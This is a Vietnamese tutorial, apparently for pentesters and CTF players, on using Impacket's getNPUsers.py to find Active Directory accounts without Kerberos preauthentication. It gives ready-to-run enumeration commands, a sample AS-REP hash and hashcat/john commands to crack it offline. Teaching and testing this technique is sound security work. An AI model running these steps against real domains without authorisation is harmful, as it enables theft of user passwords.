@@ -1,0 +1,75 @@
+getNPUsers.py là script Python trong bộ Impacket, chuyên dùng để liệt kê các user trong domain có cấu hình thuộc tính "Do not require Kerberos preauthentication". Đây là một trong các công cụ cực kỳ hữu dụng cho pentester, red team khi muốn tìm user dễ bị tấn công AS-REP Roasting trên môi trường Active Directory.
+1. Tác dụng của getNPUsers.py
+
+    Tìm các user không yêu cầu pre-authentication trong Kerberos.
+
+    Trích xuất ticket AS-REP của những user này về ở định dạng crackable (có thể dùng Hashcat/John để crack offline password).
+
+    Chuẩn bị cho tấn công AS-REP Roasting – kỹ thuật lấy hash password của user domain mà không cần credential (chỉ cần username).
+
+2. Cách dùng getNPUsers.py cơ bản
+
+Script này nằm trong bộ Impacket, cài qua:
+
+pip install impacket
+
+hoặc
+
+git clone https://github.com/fortra/impacket.git
+cd impacket/examples
+
+1. Liệt kê user dễ bị AS-REP Roasting (anonymous)
+
+Nếu domain cho phép query anonymous (hiếm gặp ngoài lab/CTF):
+
+python3 getNPUsers.py <domain>/ -usersfile <userlist.txt> -no-pass
+
+    <domain>/ : để trống username và password, dùng anonymous bind
+
+    -usersfile <userlist.txt>: file chứa list user cần thử
+
+    -no-pass: không dùng mật khẩu
+
+Ví dụ:
+
+python3 getNPUsers.py corp.local/ -usersfile users.txt -no-pass
+
+2. Dùng credential nếu anonymous bị chặn
+
+python3 getNPUsers.py <domain>/<username>:<password> -usersfile <userlist.txt>
+
+Ví dụ:
+
+python3 getNPUsers.py corp.local/khang:123456 -usersfile users.txt
+
+3. Kết quả và sử dụng
+
+    Nếu user nào có cấu hình “Do not require Kerberos preauth”, tool sẽ trả về AS-REP hash ở dạng crackable bằng Hashcat/John:
+
+$krb5asrep$23$administrator@CORP.LOCAL:fa289b... (hash ...)
+
+Copy các dòng này vào file, sau đó dùng:
+
+hashcat -m 18200 hash.txt wordlist.txt
+
+hoặc
+
+    john --wordlist=rockyou.txt hash.txt
+
+    để crack password offline.
+
+3. Thực tế sử dụng
+
+    Rất nhiều CTF, lab HTB/THM có user này: Thường là svc-xxx, test, guest, krbtgt...
+
+    Lỗ hổng phổ biến trong AD ngoài đời thật nếu admin cấu hình sai.
+
+    Không cần credential nếu domain cho phép enumerate anonymous, chỉ cần có danh sách user.
+
+    Không làm lockout account khi query.
+
+4. Tài liệu tham khảo
+
+    Impacket getNPUsers.py Usage
+
+    HackTricks: AS-REP Roasting
